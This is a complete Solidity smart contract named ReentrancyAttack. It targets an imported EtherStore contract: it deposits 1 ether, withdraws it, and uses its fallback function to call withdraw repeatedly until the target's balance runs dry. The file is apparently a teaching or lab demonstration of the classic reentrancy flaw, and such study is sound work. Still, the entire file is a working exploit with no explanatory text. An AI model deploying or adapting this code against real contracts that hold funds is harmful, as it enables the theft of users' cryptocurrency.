//SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;
import "./EtherStore.sol";


contract ReentrancyAttack {

    EtherStore public etherStore;

    constructor(address _etherStoreAddress) public {
        etherStore = EtherStore(_etherStoreAddress);
    }

    fallback() external payable {
        if(address(etherStore).balance >= 1 ether) { 
            etherStore.withdraw(1 ether);
        }

    }
    
    function attack() external payable {
        require(msg.value >= 1 ether);

        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw(1 ether);
        
    }
}

